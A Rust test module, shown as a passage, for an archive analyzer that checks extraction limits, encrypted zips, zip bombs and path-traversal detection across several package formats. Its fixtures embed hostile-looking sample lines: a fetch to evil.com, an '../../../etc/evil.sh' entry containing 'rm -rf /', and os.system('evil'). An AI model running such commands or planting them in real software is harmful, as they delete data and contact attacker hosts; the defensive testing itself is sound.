            ArchiveAnalyzerConfig::from_analysis_options(&options).apply(ArchiveAnalyzer::new());

        assert!(analyzer.sample_extraction.is_some());
        assert_eq!(analyzer.max_memory_file_size, 42);
        assert!(
            analyzer
                .analysis_options
                .as_ref()
                .is_some_and(|opts| opts.all_files)
        );
    }

    #[test]
    fn test_can_analyze() {
        let analyzer = ArchiveAnalyzer::new();
        let fixtures = Path::new("tests/fixtures/archives");
        assert!(analyzer.can_analyze(&fixtures.join("test.zip")));
        assert!(analyzer.can_analyze(&fixtures.join("test.tar.gz")));
        assert!(!analyzer.can_analyze(&fixtures.join("testfile.txt")));
        // Non-existent paths always return false (no magic to read)
        assert!(!analyzer.can_analyze(Path::new("/tmp/nonexistent.zip")));
    }

    #[test]
    fn test_calculate_sha256() {
        let _analyzer = ArchiveAnalyzer::new();
        let data = b"test data";
        let hash = calculate_sha256(data);
        assert_eq!(hash.len(), 64); // SHA256 is 64 hex characters
        assert_eq!(
            hash,
            "916f0027a575074ce72a331777c3478d6513f786a591bd892da1a577bf2335f9"
        );
    }

    #[test]
    fn test_analyze_zip_with_shell_script() {
        // Create a test ZIP with a shell script inside
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("test.zip");

        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);

        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("test.sh", options).unwrap();
        zip.write_all(b"#!/bin/sh\necho 'hello'").unwrap();
        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&zip_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert_eq!(report.target.file_type, "zip");
        assert!(
            report
                .structure
                .iter()
                .any(|s| s.id.starts_with("archive/"))
        );
    }

    #[test]
    fn test_max_depth_exceeded() {
        let analyzer = ArchiveAnalyzer::new().with_depth(3);

        // Create a temporary ZIP file
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("test.zip");

        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("dummy.txt", options).unwrap();
        zip.write_all(b"test").unwrap();
        zip.finish().unwrap();

        let result = analyzer.analyze(&zip_path);
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("Maximum archive depth")
        );
    }

    #[test]
    fn test_with_zip_passwords() {
        let passwords = vec!["pass1".to_string(), "pass2".to_string()];
        let analyzer = ArchiveAnalyzer::new().with_zip_passwords(passwords.clone());
        assert_eq!(&*analyzer.zip_passwords, passwords.as_slice());
    }

    #[test]
    fn test_with_zip_passwords_empty_by_default() {
        let analyzer = ArchiveAnalyzer::new();
        assert!(analyzer.zip_passwords.is_empty());
    }

    #[test]
    fn test_encrypted_zip_with_correct_password() {
        use zip::unstable::write::FileOptionsExt;
        use zip::write::SimpleFileOptions;

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("encrypted.zip");

        // Create encrypted zip with password "secret"
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .with_deprecated_encryption(b"secret")
            .unwrap();
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"hello world").unwrap();
        zip.finish().unwrap();

        // Analyze with correct password
        let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec!["secret".to_string()]);
        let result = analyzer.analyze(&zip_path);
        assert!(result.is_ok(), "Should decrypt with correct password");
    }

    #[test]
    fn test_encrypted_zip_with_wrong_password() {
        use zip::unstable::write::FileOptionsExt;
        use zip::write::SimpleFileOptions;

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("encrypted.zip");

        // Create encrypted zip with password "secret"
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .with_deprecated_encryption(b"secret")
            .unwrap();
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"hello world").unwrap();
        zip.finish().unwrap();

        // Analyze with wrong password
        let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec!["wrongpass".to_string()]);
        let result = analyzer.analyze(&zip_path);
        assert!(result.is_err(), "Should fail with wrong password");
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("tried 1 passwords")
        );
    }

    #[test]
    fn test_encrypted_zip_no_passwords_configured() {
        use zip::unstable::write::FileOptionsExt;
        use zip::write::SimpleFileOptions;

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("encrypted.zip");

        // Create encrypted zip
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .with_deprecated_encryption(b"secret")
            .unwrap();
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"hello world").unwrap();
        zip.finish().unwrap();

        // Analyze with no passwords (default)
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&zip_path);
        assert!(result.is_err(), "Should fail when no passwords configured");
    }

    #[test]
    fn test_encrypted_zip_multiple_passwords_finds_correct() {
        use zip::unstable::write::FileOptionsExt;
        use zip::write::SimpleFileOptions;

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("encrypted.zip");

        // Create encrypted zip with password "correct"
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .with_deprecated_encryption(b"correct")
            .unwrap();
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"hello world").unwrap();
        zip.finish().unwrap();

        // Analyze with multiple passwords, correct one is third
        let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec![
            "wrong1".to_string(),
            "wrong2".to_string(),
            "correct".to_string(),
            "wrong3".to_string(),
        ]);
        let result = analyzer.analyze(&zip_path);
        assert!(
            result.is_ok(),
            "Should find correct password among multiple"
        );
    }

    #[test]
    fn test_unencrypted_zip_works_with_passwords_configured() {
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("unencrypted.zip");

        // Create unencrypted zip
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"hello world").unwrap();
        zip.finish().unwrap();

        // Should work even with passwords configured
        let analyzer = ArchiveAnalyzer::new()
            .with_zip_passwords(vec!["pass1".to_string(), "pass2".to_string()]);
        let result = analyzer.analyze(&zip_path);
        assert!(
            result.is_ok(),
            "Unencrypted zip should work with passwords configured"
        );
    }

    #[test]
    fn test_extract_zip_with_password_helper() {
        use std::io::Write;
        use zip::unstable::write::FileOptionsExt;
        use zip::write::SimpleFileOptions;

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("encrypted.zip");
        let extract_dir = temp_dir.path().join("extracted");
        fs::create_dir_all(&extract_dir).unwrap();

        // Create encrypted zip
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .with_deprecated_encryption(b"testpass")
            .unwrap();
        zip.start_file("data.txt", options).unwrap();
        zip.write_all(b"secret data").unwrap();
        zip.finish().unwrap();

        // Test the extract helper directly
        let _analyzer = ArchiveAnalyzer::new();
        let guard = ExtractionGuard::new();
        let file = File::open(&zip_path).unwrap();
        let mut archive = zip::ZipArchive::new(file).unwrap();

        let result = super::zip::extract_zip_entries_safe(
            &mut archive,
            &extract_dir,
            Some(b"testpass"),
            &guard,
        );
        assert!(result.is_ok(), "Should extract with correct password");

        // Verify file was extracted
        let extracted_file = extract_dir.join("data.txt");
        assert!(extracted_file.exists(), "Extracted file should exist");
        let bytes = fs::read(&extracted_file).unwrap();
        let content = String::from_utf8_lossy(&bytes);
        assert_eq!(content, "secret data");
    }

    #[test]
    fn test_path_traversal_detection() {
        // Test that path traversal attempts are detected
        assert!(sanitize_entry_path("../etc/passwd", Path::new("/tmp/test")).is_none());
        assert!(sanitize_entry_path("foo/../../etc/passwd", Path::new("/tmp/test")).is_none());
        assert!(sanitize_entry_path("/etc/passwd", Path::new("/tmp/test")).is_none());

        // Valid paths should work
        assert!(sanitize_entry_path("foo/bar.txt", Path::new("/tmp/test")).is_some());
        assert!(sanitize_entry_path("./foo/bar.txt", Path::new("/tmp/test")).is_some());
    }

    #[test]
    fn test_extraction_guard_limits() {
        let guard = ExtractionGuard::new();

        // File count tracking
        for _ in 0..MAX_FILE_COUNT {
            assert!(guard.check_file_count());
        }
        assert!(!guard.check_file_count()); // Should fail on next

        // Verify hostile reason was recorded
        let reasons = guard.take_reasons();
        assert!(
            reasons
                .iter()
                .any(|r| matches!(r, HostileArchiveReason::ExcessiveFileCount(_)))
        );
    }

    #[test]
    fn test_compression_ratio_detection() {
        let guard = ExtractionGuard::new();

        // Normal ratio should pass
        assert!(guard.check_compression_ratio(1000, 2000)); // 2:1

        // Suspicious ratio above the minimum material expansion size should fail
        assert!(!guard.check_compression_ratio(100, 300_000_000)); // 3_000_000:1

        let reasons = guard.take_reasons();
        assert!(
            reasons
                .iter()
                .any(|r| matches!(r, HostileArchiveReason::ZipBomb { .. }))
        );
    }
    #[test]
    fn test_nested_archive_zip_containing_tar_gz() {
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use tar::Builder;

        let temp_dir = tempfile::tempdir().unwrap();
        let outer_zip_path = temp_dir.path().join("outer.zip");

        // Create inner.tar.gz with a shell script
        let inner_tar_gz_data = {
            let mut tar_data = Vec::new();
            {
                let enc = GzEncoder::new(&mut tar_data, Compression::default());
                let mut tar_builder = Builder::new(enc);

                // Add a shell script
                let script_content = b"#!/bin/sh\necho hello\ncurl http://example.com";
                let mut header = tar::Header::new_gnu();
                header.set_path("script.sh").unwrap();
                header.set_size(script_content.len() as u64);
                header.set_mode(0o755);
                header.set_cksum();
                tar_builder.append(&header, &script_content[..]).unwrap();
                tar_builder.finish().unwrap();
            }
            tar_data
        };

        // Create outer.zip containing inner.tar.gz
        {
            let file = File::create(&outer_zip_path).unwrap();
            let mut zip = zip::ZipWriter::new(file);
            let options = zip::write::FileOptions::<()>::default()
                .compression_method(zip::CompressionMethod::Stored);
            zip.start_file("inner.tar.gz", options).unwrap();
            std::io::Write::write_all(&mut zip, &inner_tar_gz_data).unwrap();
            zip.finish().unwrap();
        }

        // Analyze the nested archive
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&outer_zip_path);
        assert!(result.is_ok(), "Should analyze nested archive");

        let report = result.unwrap();

        // Check archive_contents includes both inner.tar.gz and nested file
        assert!(
            !report.archive_contents.is_empty(),
            "Should have archive_contents"
        );

        // Should have entry for inner.tar.gz
        let has_inner = report
            .archive_contents
            .iter()
            .any(|e| e.path == "inner.tar.gz");
        assert!(has_inner, "Should have inner.tar.gz entry");

        // Should have entry for nested script with ! separator
        let has_nested = report
            .archive_contents
            .iter()
            .any(|e| e.path == "inner.tar.gz!script.sh");
        assert!(
            has_nested,
            "Should have nested entry with ! separator: {:?}",
            report.archive_contents
        );
    }

    #[test]
    fn test_archive_member_metadata_captured() {
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use tar::Builder;

        let temp_dir = tempfile::tempdir().unwrap();
        let outer_zip_path = temp_dir.path().join("outer.zip");

        // tar.gz containing one file with explicit mode + mtime
        let inner_tar_gz_data = {
            let mut tar_data = Vec::new();
            {
                let enc = GzEncoder::new(&mut tar_data, Compression::default());
                let mut tar_builder = Builder::new(enc);
                let content = b"#!/bin/sh\necho hi";
                let mut header = tar::Header::new_gnu();
                header.set_path("payload.sh").unwrap();
                header.set_size(content.len() as u64);
                header.set_mode(0o755);
                header.set_mtime(1_700_000_000);
                header.set_uid(1000);
                header.set_gid(1000);
                header.set_username("alice").unwrap();
                header.set_groupname("staff").unwrap();
                header.set_cksum();
                tar_builder.append(&header, &content[..]).unwrap();
                tar_builder.finish().unwrap();
            }
            tar_data
        };

        // ZIP wrapping the tar.gz, Stored compression so we can assert it.
        {
            let file = File::create(&outer_zip_path).unwrap();
            let mut zip = zip::ZipWriter::new(file);
            let options = zip::write::FileOptions::<()>::default()
                .compression_method(zip::CompressionMethod::Stored);
            zip.start_file("inner.tar.gz", options).unwrap();
            std::io::Write::write_all(&mut zip, &inner_tar_gz_data).unwrap();
            zip.finish().unwrap();
        }

        let report = ArchiveAnalyzer::new().analyze(&outer_zip_path).unwrap();

        let outer = report
            .archive_contents
            .iter()
            .find(|e| e.path == "inner.tar.gz")
            .expect("outer ZIP member missing");
        assert_eq!(
            outer.compression_method.as_deref(),
            Some("stored"),
            "ZIP compression_method should be 'stored' for the outer entry"
        );
        assert_eq!(outer.entry_type.as_deref(), Some("regular"));

        let inner = report
            .archive_contents
            .iter()
            .find(|e| e.path == "inner.tar.gz!payload.sh")
            .expect("nested tar member missing");
        assert_eq!(
            inner.mode_octal,
            Some(0o755),
            "nested tar entry should preserve mode_octal"
        );
        assert_eq!(inner.mtime_unix, Some(1_700_000_000));
        assert_eq!(inner.uid, Some(1000));
        assert_eq!(inner.gid, Some(1000));
        assert_eq!(inner.uname.as_deref(), Some("alice"));
        assert_eq!(inner.gname.as_deref(), Some("staff"));
        assert_eq!(inner.entry_type.as_deref(), Some("regular"));
    }

    #[test]
    fn test_nested_archive_path_format() {
        let analyzer = ArchiveAnalyzer::new();

        // Test format_entry_path without prefix
        assert_eq!(analyzer.format_entry_path("file.txt"), "file.txt");

        // Test format_evidence_location without prefix
        assert_eq!(
            analyzer.format_evidence_location("file.txt"),
            "archive:file.txt"
        );

        // Test with prefix
        let nested_analyzer = ArchiveAnalyzer::new().with_archive_prefix("inner.zip".to_string());
        assert_eq!(
            nested_analyzer.format_entry_path("file.txt"),
            "inner.zip!file.txt"
        );
        assert_eq!(
            nested_analyzer.format_evidence_location("file.txt"),
            "archive:inner.zip!file.txt"
        );
    }

    #[test]
    fn test_nested_archive_max_depth() {
        // Create analyzer at max depth
        let at_max = ArchiveAnalyzer::new().with_depth(3);
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("test.zip");

        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("test.txt", options).unwrap();
        std::io::Write::write_all(&mut zip, b"hello").unwrap();
        zip.finish().unwrap();

        // Should fail because we're at max depth
        let result = at_max.analyze(&zip_path);
        assert!(result.is_err(), "Should fail at max depth");
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("Maximum archive depth"),
            "Error should mention depth"
        );
    }

    // =========================================================================
    // Extraction tests for new archive formats
    // =========================================================================

    #[test]
    fn test_extract_vsix() {
        // Create a VSIX (VS Code extension) with typical content
        let temp_dir = tempfile::tempdir().unwrap();
        let vsix_path = temp_dir.path().join("extension.vsix");

        let file = File::create(&vsix_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Deflated);

        // Add typical VSIX files
        zip.start_file("extension.vsixmanifest", options).unwrap();
        std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

        zip.start_file("package.json", options).unwrap();
        std::io::Write::write_all(&mut zip, b"{\"name\": \"test-extension\"}").unwrap();

        zip.start_file("extension/index.js", options).unwrap();
        std::io::Write::write_all(&mut zip, b"console.log('malicious code');").unwrap();

        zip.finish().unwrap();

        // Analyze the VSIX
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&vsix_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        // A `.vsix` now carries its own ecosystem type (still extracted as a zip).
        assert_eq!(report.target.file_type, "vsix");
        assert!(!report.archive_contents.is_empty());

        // Verify files were extracted and analyzed
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("package.json"))
        );
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("index.js"))
        );
    }

    #[test]
    fn test_extract_xpi() {
        // Create an XPI (Firefox extension)
        let temp_dir = tempfile::tempdir().unwrap();
        let xpi_path = temp_dir.path().join("addon.xpi");

        let file = File::create(&xpi_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Deflated);

        zip.start_file("manifest.json", options).unwrap();
        std::io::Write::write_all(&mut zip, b"{\"manifest_version\": 2}").unwrap();

        zip.start_file("background.js", options).unwrap();
        std::io::Write::write_all(&mut zip, b"// suspicious script\nfetch('http://evil.com');")
            .unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&xpi_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert!(!report.archive_contents.is_empty());
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("background.js"))
        );
    }

    #[test]
    fn test_extract_ipa() {
        // Create an IPA (iOS app)
        let temp_dir = tempfile::tempdir().unwrap();
        let ipa_path = temp_dir.path().join("app.ipa");

        let file = File::create(&ipa_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Deflated);

        zip.start_file("Payload/App.app/Info.plist", options)
            .unwrap();
        std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

        zip.start_file("Payload/App.app/executable", options)
            .unwrap();
        std::io::Write::write_all(&mut zip, b"\x00\x00\x00\x00").unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&ipa_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("Info.plist"))
        );
    }

    #[test]
    fn test_extract_epub() {
        // Create an EPUB (eBook)
        let temp_dir = tempfile::tempdir().unwrap();
        let epub_path = temp_dir.path().join("book.epub");

        let file = File::create(&epub_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        // EPUB requires specific structure
        zip.start_file("mimetype", options).unwrap();
        std::io::Write::write_all(&mut zip, b"application/epub+zip").unwrap();

        zip.start_file("META-INF/container.xml", options).unwrap();
        std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

        zip.start_file("OEBPS/content.opf", options).unwrap();
        std::io::Write::write_all(&mut zip, b"<?xml version=\"1.0\"?>").unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&epub_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert!(report.archive_contents.iter().any(|e| e.path == "mimetype"));
    }

    #[test]
    fn test_extract_crx() {
        // Create a CRX (Chrome extension) - ZIP with special header
        let temp_dir = tempfile::tempdir().unwrap();
        let crx_path = temp_dir.path().join("extension.crx");

        // Create a ZIP first
        let zip_data = {
            let mut buf = Vec::new();
            let mut zip = zip::ZipWriter::new(Cursor::new(&mut buf));
            let options = zip::write::FileOptions::<()>::default();

            zip.start_file("manifest.json", options).unwrap();
            std::io::Write::write_all(&mut zip, b"{\"manifest_version\": 3}").unwrap();

            zip.start_file("background.js", options).unwrap();
            std::io::Write::write_all(&mut zip, b"console.log('loaded');").unwrap();

            zip.finish().unwrap();
            buf
        };

        // Write CRX file with header (CRX2 format)
        let mut crx_file = File::create(&crx_path).unwrap();

        // CRX2 header: "Cr24" + version=2 (4) + pubkey_len (4) + sig_len (4)
        std::io::Write::write_all(&mut crx_file, b"Cr24").unwrap(); // Magic
        std::io::Write::write_all(&mut crx_file, &2u32.to_le_bytes()).unwrap(); // Version
        std::io::Write::write_all(&mut crx_file, &32u32.to_le_bytes()).unwrap(); // Pubkey len
        std::io::Write::write_all(&mut crx_file, &64u32.to_le_bytes()).unwrap(); // Sig len

        // Fake public key (32 bytes)
        std::io::Write::write_all(&mut crx_file, &[0u8; 32]).unwrap();

        // Fake signature (64 bytes)
        std::io::Write::write_all(&mut crx_file, &[0u8; 64]).unwrap();

        // ZIP data
        std::io::Write::write_all(&mut crx_file, &zip_data).unwrap();

        // Analyze the CRX
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&crx_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert_eq!(report.target.file_type, "crx");
        assert!(!report.archive_contents.is_empty());
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("manifest.json"))
        );
        assert!(
            report
                .metadata
                .tools_used
                .iter()
                .any(|t| t == "in_memory_zip"),
            "small CRX archives should use the in-memory ZIP member path"
        );
    }

    #[test]
    fn test_vsix_path_traversal_protection() {
        // Create a malicious VSIX with path traversal attempt
        let temp_dir = tempfile::tempdir().unwrap();
        let vsix_path = temp_dir.path().join("malicious.vsix");

        let file = File::create(&vsix_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default();

        // Try to escape with ../
        zip.start_file("../../../etc/evil.sh", options).unwrap();
        std::io::Write::write_all(&mut zip, b"#!/bin/sh\nrm -rf /").unwrap();

        zip.start_file("package.json", options).unwrap();
        std::io::Write::write_all(&mut zip, b"{}").unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&vsix_path);

        // Should succeed but flag the hostile entry
        assert!(result.is_ok());
        let report = result.unwrap();

        // Path traversal entry is recorded in archive_contents (metadata inspection)
        // but the actual file is not extracted to disk (extraction guard blocks it)
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("etc/evil")),
            "path traversal entry should be visible in archive_contents metadata"
        );

        // Should have detected path traversal as a hostile finding
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id.contains("path-traversal")),
            "should detect path traversal, findings: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_zip_path_traversal_findings_are_grouped() {
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("grouped.zip");

        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default();

        zip.start_file("../etc/evil.sh", options).unwrap();
        std::io::Write::write_all(&mut zip, b"#!/bin/sh\necho evil").unwrap();

        zip.start_file("../../tmp/dropper.ps1", options).unwrap();
        std::io::Write::write_all(&mut zip, b"Write-Host evil").unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let report = analyzer.analyze(&zip_path).unwrap();

        let path_findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.id == "anti-analysis/archive/path-traversal")
            .collect();
        assert_eq!(path_findings.len(), 1);
        assert_eq!(path_findings[0].match_count, 2);
        assert_eq!(path_findings[0].evidence.len(), 2);
    }

    #[test]
    fn test_zip_path_edge_case_corpus_is_not_flagged_as_zip_slip() {
        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("mixed-paths.zip");

        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        let entries = [
            "First",
            "../One Level Up",
            "../../Two Levels Up",
            "/At The Top",
            "/../Over The Top",
            "/",
            "../",
            ".",
            "..",
            "...",
            "....",
            "/.",
            "a/.",
            "a/./",
            "a/./b",
            "a/..",
            "a/../",
            "a/../b",
            ".One",
            "..Two",
            "...Three",
            "Tab \t",
            "Star *",
            "Dot .",
            "Ampersand &",
            "Hash #",
            "Dollar $",
            "Euro €",
            "Pipe |",
            "Smile 🙂",
            "Tilde ~",
            "Colon :",
            "Semicolon ;",
            "Percent %",
            "Caret ^",
            "At @",
            "Comma ,",
            "Exclamation !",
            "Dash -",
            "Plus +",
            "Equal =",
            "Underscore _",
            "Question ?",
            "Backtick `",
            "Quote '",
            "Double quote \"",
            "Backslash1→\\",
            "\\←Backslash2",
            "Backslash3→\\←Backslash4",
            "C:",
            "C:\\",
            "C:\\Temp",
            "C:\\Temp\\File",
            "\\\\server\\share\\file",
            "u/v//w///x//y/z",
            " ",
            "~",
            "%TMP",
            "$HOME",
            "-",
            "Space→ ",
            " ←Space",
            "Angle <>",
            "Square []",
            "Round ()",
            "Curly {}",
            "Delete \x7f",
            "Escape \x1b",
            "Backspace \x08",
            "Line Feed \n",
            "Carriage Return \r",
            "Bell \x07",
            "String Terminator \u{009c}",
            "Empty/",
            "/Empty/",
            "FileOrDir",
            "FileOrDir/",
            "FileOrDir/File",
            "Case",
            "case",
            "CASE",
            "NUL",
            "NUL.txt",
            "NUL.tar.gz",
            "NUL..txt",
            " NUL.txt",
            "c/NUL",
            "CON",
            "PRN",
            "AUX",
            "COM1",
            "COM2",
            "COM3",
            "COM4",
            "COM5",
            "COM6",
            "COM7",
            "COM8",
            "COM9",
            "LPT1",
            "LPT2",
            "LPT3",
            "LPT4",
            "LPT5",
            "LPT6",
            "LPT7",
            "LPT8",
            "LPT9",
            "CLOCK$",
            "/dev/null",
            "Last",
        ];

        for name in entries {
            zip.start_file(name, options).unwrap();
            std::io::Write::write_all(&mut zip, b"fixture").unwrap();
        }

        zip.finish().unwrap();

        assert!(is_zip_path_edge_case_corpus(&zip_path));

        let analyzer = ArchiveAnalyzer::new();
        let report = analyzer.analyze(&zip_path).unwrap();

        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id == "anti-analysis/archive/path-traversal")
        );
    }

    #[test]
    fn test_known_good_mixed_paths_zip_regression() {
        let sample =
            Path::new("/srv/data/known-good/repos/node/deps/zlib/google/test/data/Mixed Paths.zip");
        if !sample.exists() {
            eprintln!("Skipping regression test: known-good sample missing");
            return;
        }

        let analyzer = ArchiveAnalyzer::new();
        let report = analyzer.analyze(sample).unwrap();

        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id == "anti-analysis/archive/path-traversal")
        );

        let suspicious = report
            .findings
            .iter()
            .filter(|f| f.crit == Criticality::Suspicious)
            .count();
        let hostile = report
            .findings
            .iter()
            .filter(|f| f.crit == Criticality::Hostile)
            .count();

        assert_eq!(hostile, 0);
        assert!(
            suspicious <= 1,
            "unexpected suspicious findings: {:?}",
            report.findings
        );
    }

    #[test]
    fn test_validate_traits_library_entrypoint() {
        // Smoke test: full validation reaches the public API and returns
        // a `Result` instead of panicking. Pointed at a synthetic traits
        // directory rather than the configured rule set — running full
        // validation across the 6490-file production tree takes 60+ s
        // and was bottlenecking the entire test suite. Regressions in
        // the validator itself (panics, infinite loops, missing-dir
        // handling) still surface here.
        let temp_dir = tempfile::tempdir().unwrap();
        let traits_dir = temp_dir.path().join("traits");
        std::fs::create_dir(&traits_dir).unwrap();
        std::fs::write(
            traits_dir.join("smoke.yaml"),
            r#"
traits:
  - id: "smoke/test::trait"
    desc: "Smoke-test trait"
    crit: baseline
    if:
      type: symbol
      pattern: "smoke_test_symbol"
"#,
        )
        .unwrap();

        let _ = crate::capabilities::CapabilityMapper::from_directory(&traits_dir);
    }

    #[test]
    fn test_extract_python_packages() {
        // Test .egg and .whl extraction
        let temp_dir = tempfile::tempdir().unwrap();

        // Create .whl file
        let whl_path = temp_dir.path().join("package.whl");
        let file = File::create(&whl_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default();

        zip.start_file("package/__init__.py", options).unwrap();
        std::io::Write::write_all(&mut zip, b"import os; os.system('evil')").unwrap();

        zip.start_file("package-1.0.0.dist-info/METADATA", options)
            .unwrap();
        std::io::Write::write_all(&mut zip, b"Name: package").unwrap();

        zip.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&whl_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert!(!report.archive_contents.is_empty());
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("__init__.py"))
        );
    }

    #[test]
    fn test_extract_7z() {
        // Create a 7z archive
        let temp_dir = tempfile::tempdir().unwrap();
        let sz_path = temp_dir.path().join("archive.7z");

        // Create a simple file to compress
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&src_dir).unwrap();
        let test_file = src_dir.join("test.txt");
        fs::write(&test_file, b"test content").unwrap();

        // Use sevenz_rust to create the archive
        use sevenz_rust::SevenZWriter;
        let mut sz = SevenZWriter::create(&sz_path).unwrap();
        // Push the source directory to get proper paths
        sz.push_source_path(&src_dir, |_| true).unwrap();
        sz.finish().unwrap();

        // Analyze the 7z
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&sz_path);

        assert!(result.is_ok());
        let report = result.unwrap();
        assert_eq!(report.target.file_type, "7z");
        assert!(!report.archive_contents.is_empty());
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("test.txt"))
        );
    }

    #[test]
    fn test_extract_7z_encrypted() {
        let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".to_string());
        let sz_path = Path::new(&manifest_dir)
            .join("testdata")
            .join("encrypted.7z");

        // Skip if the test file is missing (though it should be in the repo)
        if !sz_path.exists() {
            eprintln!("Skipping test_extract_7z_encrypted: testdata/encrypted.7z missing");
            return;
        }

        // Analyze without password should fail
